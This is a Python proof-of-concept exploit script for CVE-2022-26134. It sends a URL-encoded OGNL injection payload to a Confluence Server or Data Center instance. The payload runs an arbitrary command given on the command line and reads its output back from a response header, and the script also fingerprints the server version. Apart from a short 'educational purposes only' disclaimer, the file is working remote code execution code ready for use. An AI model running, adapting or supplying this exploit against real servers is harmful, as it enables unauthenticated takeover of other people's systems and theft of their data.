from bs4 import BeautifulSoup
import requests
import sys

"""
PoC for CVE-2022-26134. OGNL injection vulnerability, allows an unauthenticated
attacker to execute arbitrary code on a Confluence Server or Data Center
instance.
"""

"""
LEGAL DISCLAIMER:
This tool is STRICTLY for EDUCATIONAL PURPOSES ONLY!
Usage of this tool for attacking targets without prior mutual consent is ILLEGAL.
It is the user's responsibility to obey all laws that apply whilst using this tool.
The developer of this tool assumes no liability and is not responsible for any misuse
or damage caused by this program.
"""

#~~~< Runs The Exploit With Given Command >~~~#
def run_exploit(target, command):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Accept': '*/*',
                   }
        
        response = requests.get(target+'/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22'+command+'%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/', headers=headers, verify=False, allow_redirects=False)
        if response.status_code == 302:
            output = response.headers['X-Cmd-Response']
            return output
        
        else:
            return "<No Output>"

    except Exception:
        return "[ ! ] Error. Either; Command Had No Output, Command Was Invalid, or An Error Running The Exploit."

#~~~< Fetches The Current Running Version >~~~#
def fetch_version(target):
    try:
        response = requests.get(f"{target}/login.action", verify=False)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "lxml")
            current_version = soup.find_all(id="footer-build-information")[0].text
            return True, current_version

        else:
            return False, "[ ! ] Could Not Reach '/login.action' Endpoint"

    except Exception:
        return False, "[ ! ] An Error Occurred Fetching The Version..."

#~~~< Checks If Target URL Exists >~~~#
def check_target_up(target):
    try:
        response = requests.get(target)
        return True

    except Exception:
        return False

#~~~< Format Command-Line Arguments >~~~#
if(len(sys.argv) < 3):
    print(f"[ ! ] Improper Usage.\n[info] Example: python3 {sys.argv[0]} http://target-website.com whoami")

else:
    try:
        target_website = sys.argv[1]
        command = sys.argv[2]

        print(f"[ + ] Checking If Target Website Is Up... ", end='')
        if check_target_up(target_website):
            print(f"[SUCCESS]\n[ * ] Target: '{target_website}' Is Up.")
        else:
            print(f"[FAILURE]\n[ ! ] Target: '{target_website}' Seems To Be Down.\n[ ! ] Exiting...")
            sys.exit(0)
        
        print(f"\n[ + ] Fetching Confluence Version... ", end='')
        success, version = fetch_version(target_website)
        if success:
            print(f"[SUCCESS]\n[ * ] Confluence Version: {version}")
        else:
            print(f"[FAILURE]\n{version}")

        print(f"\n{'='*45}\n[ + ] Attempting To Run Command on Target...\n{'='*45}")
        output = run_exploit(target_website, command)
        print(f"[ * ] Output:\n{output}")

    except KeyboardInterrupt:
        print("\n[ ! ] CTRL+C Pressed. Exiting...")
        sys.exit(0)
    
